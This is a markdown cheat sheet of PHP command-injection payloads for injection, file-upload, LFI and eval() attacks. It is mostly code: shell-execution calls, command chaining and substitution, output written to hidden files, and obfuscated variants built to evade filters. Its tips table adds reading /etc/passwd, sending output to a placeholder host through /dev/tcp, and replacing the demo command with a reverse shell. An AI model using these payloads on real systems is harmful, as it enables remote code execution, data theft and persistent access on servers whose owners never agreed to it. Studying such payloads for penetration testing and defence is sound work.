# PHP Command Injection

These work in **command injection**, **file upload**, **LFI + PHP wrappers**, or **eval()** scenarios.

## Basic Execution Functions

```php
<?php system("id"); ?>
<?php shell_exec("id"); ?>
<?php passthru("id"); ?>
<?php exec("id"); ?>
<?php `id`; ?>
<?php popen("id", "r"); ?>
<?php proc_open("id", array(0=>array("pipe","r"),1=>array("pipe","w")), $pipes); ?>
```

## With Output Handling

```php
<?php system("id"); ?>
<?php shell_exec("id"); ?>
<?php passthru("id"); ?>
<?php exec("id", $output); echo implode("\n", $output); ?>
<?php print `$id`; ?>
<?php echo shell_exec("id"); ?>
<?php echo passthru("id"); ?>
<?php echo exec("id"); ?>
<?php echo `id`; ?>
<?php $output = shell_exec("id"); echo $output; ?>
```

## With Stderr Redirection

```php
<?php system("id 2>&1"); ?>
<?php shell_exec("id 2>&1"); ?>
<?php passthru("id 2>&1"); ?>
<?php exec("id 2>&1", $out); print_r($out); ?>
<?php `id 2>&1`; ?>
```

## With File Output

```php
<?php system("id | tee output.txt"); ?>
<?php shell_exec("id > /tmp/out"); ?>
<?php passthru("id >> /tmp/out"); ?>
<?php exec("id > /dev/null"); ?>
<?php `id > /tmp/result`; ?>
```

## Command Chaining

```php
<?php system("id;whoami"); ?>
<?php shell_exec("id;uname -a"); ?>
<?php passthru("id && whoami"); ?>
<?php exec("id || whoami"); ?>
<?php `id; pwd`; ?>
```

## With Comments / Truncation

```php
<?php system("id #"); ?>
<?php shell_exec("id # comment"); ?>
<?php passthru("id /*comment*/"); ?>
<?php exec("id `whoami`"); ?>
<?php `id $(whoami)`; ?>
```

## With Variable Expansion / Substitution

```php
<?php system("id $(id)"); ?>
<?php shell_exec("id `id`"); ?>
<?php passthru("id ${PATH}"); ?>
<?php exec("id $USER"); ?>
<?php `id $HOME`; ?>
```

## With Piping / Post-Processing

```php
<?php system("id;ls"); ?>
<?php shell_exec("id|grep uid"); ?>
<?php passthru("id|base64"); ?>
<?php exec("id", $a); echo join($a); ?>
<?php `id|rev`; ?>
```

## With Logging / Redirection

```php
<?php system("id > /tmp/.log"); ?>
<?php shell_exec("id >> /tmp/.log"); ?>
<?php passthru("id 2>/dev/null"); ?>
<?php exec("id 2>/tmp/err"); ?>
```

---

## Encoded / Obfuscated Variants (for filters)

```php
<?php system(base64_decode("aWQ=")); ?>
<?php shell_exec(str_rot13("vq")); ?>
<?php passthru(gzinflate(base64_decode("eJxLsjU0NDA3tFAEAAAdAwHn"))); ?>
<?php eval('system("id");'); ?>
<?php assert('system("id");'); ?>
<?php preg_replace("/.*/e", "system('id')", "x"); ?>
<?php $a="sy"."stem"; $a("id"); ?>
<?php call_user_func("syst"."em", "id"); ?>
<?php $f=create_function('', 'system("id");'); $f(); ?>
```

---

## Pro Tips

| Scenario | Use This |
|----------|----------|
| **Blind injection** | `;id>/tmp/out` → check later |
| **Filtered `system`** | Use `exec`, `` ` ``, `passthru`, `shell_exec` |
| **Space filtered** | `id$(whoami)` or `id< /etc/passwd` |
| **Blacklisted words** | `base64 -d <<< aWQ=` → `id` |
| **Output not shown** | `\|tee /tmp/.log` or `>/dev/tcp/IP/PORT` |
| **Need reverse shell** | Replace `id` with full reverse shell |
